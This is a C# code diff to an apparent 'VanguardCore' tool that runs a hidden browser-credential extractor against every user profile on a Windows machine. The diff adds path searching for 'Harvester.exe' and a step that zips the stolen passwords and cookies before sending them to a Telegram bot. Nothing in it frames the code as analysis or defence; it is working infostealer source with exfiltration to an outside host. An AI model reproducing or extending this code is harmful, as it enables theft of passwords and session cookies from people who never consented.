@@ -12,12 +12,14 @@ namespace VanguardCore
     {
         private static string GetBaseDir()
         {
-            // When hosted via Python, BaseDirectory points to python.exe location.
-            // We use the location of the compiled SafetyManager.dll (or similar) to find the project root.
-            string dllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            string binFolder = Path.GetDirectoryName(dllPath); 
-            // The project root is one level up from "bin"
-            return Directory.GetParent(binFolder).FullName;
+            try
+            {
+                string dllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                string binFolder = Path.GetDirectoryName(dllPath); 
+                DirectoryInfo parent = Directory.GetParent(binFolder);
+                return parent != null ? parent.FullName : binFolder;
+            }
+            catch { return AppDomain.CurrentDomain.BaseDirectory; }
         }
 
         public static async Task<bool> Run(string botToken, string chatId, string baseDir)
@@ -25,14 +27,23 @@ namespace VanguardCore
             try
             {
                 if (string.IsNullOrEmpty(baseDir)) baseDir = GetBaseDir();
-                string elevatorPath = Path.Combine(baseDir, "core", "chromelevator.exe");
                 
-                if (!File.Exists(elevatorPath))
+                // Flexible path resolution
+                string[] searchPaths = {
+                    Path.Combine(baseDir, "core", "Harvester.exe"),
+                    Path.Combine(baseDir, "bin", "Harvester.exe"),
+                    Path.Combine(baseDir, "Harvester.exe"),
+                    Path.Combine(baseDir, "core", "chromelevator.exe"),
+                    Path.Combine(baseDir, "bin", "chromelevator.exe")
+                };
+
+                string elevatorPath = "";
+                foreach (var p in searchPaths)
                 {
-                    elevatorPath = Path.Combine(baseDir, "bin", "chromelevator.exe");
+                    if (File.Exists(p)) { elevatorPath = p; break; }
                 }
 
-                if (!File.Exists(elevatorPath)) return false;
+                if (string.IsNullOrEmpty(elevatorPath)) return false;
 
                 string outputDir = Path.Combine(baseDir, "core", "output");
                 if (!Directory.Exists(outputDir)) Directory.CreateDirectory(outputDir);
@@ -52,7 +63,6 @@ namespace VanguardCore
                         userName.Equals("All Users", StringComparison.OrdinalIgnoreCase))
                         continue;
 
-                    // Skip protected system folders if possible
                     try { Directory.GetFiles(userDir); } catch { continue; }
 
                     ProcessStartInfo psi = new ProcessStartInfo
@@ -63,10 +73,6 @@ namespace VanguardCore
                         CreateNoWindow = true,
                         WindowStyle = ProcessWindowStyle.Hidden
                     };
-                    
-                    // Note: ChromeElevator usually extracts from the CURRENT user context.
-                    // For multiple users, it might need to be run as that user or pointed to their path.
-                    // However, we target BrowserManager scaling for now.
                     
                     Process p = Process.Start(psi);
                     if (p != null) p.WaitForExit(60000); 
@@ -96,21 +102,43 @@ namespace VanguardCore
                     summary.AppendLine("📻 Cookies captured successfully.");
                 }
 
-                // 3. Send Report
+                // 3. Create Archive
+                string archivePath = Path.Combine(outputDir, string.Format("BrowserData_{0:yyyyMMdd_HHmmss}.zip", DateTime.Now));
+                bool archived = CreateArchive(outputDir, archivePath);
+
+                // 4. Send Report
                 bool success = false;
-                if (File.Exists(prettyPasswords))
+                if (archived && File.Exists(archivePath))
+                {
+                    success = await NetworkingManager.SendFile(botToken, chatId, archivePath, summary.ToString());
+                }
+                else if (File.Exists(prettyPasswords)) // Fallback if zip fails
                 {
                     success = await NetworkingManager.SendFile(botToken, chatId, prettyPasswords, summary.ToString());
-                }
-                
-                if (File.Exists(cookiesFile))
-                {
-                    await NetworkingManager.SendFile(botToken, chatId, cookiesFile, "Browser Cookies");
                 }
 
                 return success;
             }
             catch { return false; }
+        }
+
+        private static bool CreateArchive(string sourceDir, string zipPath)
+        {
+            try
+            {
+                // We use dynamic loading to avoid hard dependency on System.IO.Compression.FileSystem if possible,
+                // but for simplicity here we assume .NET 4.5+ ZipFile exists.
+                if (File.Exists(zipPath)) File.Delete(zipPath);
+                
+                // If System.IO.Compression is not available, this will throw
+                System.IO.Compression.ZipFile.CreateFromDirectory(sourceDir, zipPath);
+                return true;
+            }
+            catch 
+            {
+                // Fallback or manual zip logic could go here
+                return false; 
+            }
         }
 
         private static void GeneratePrettyFile(string inputFile, string outputFile)
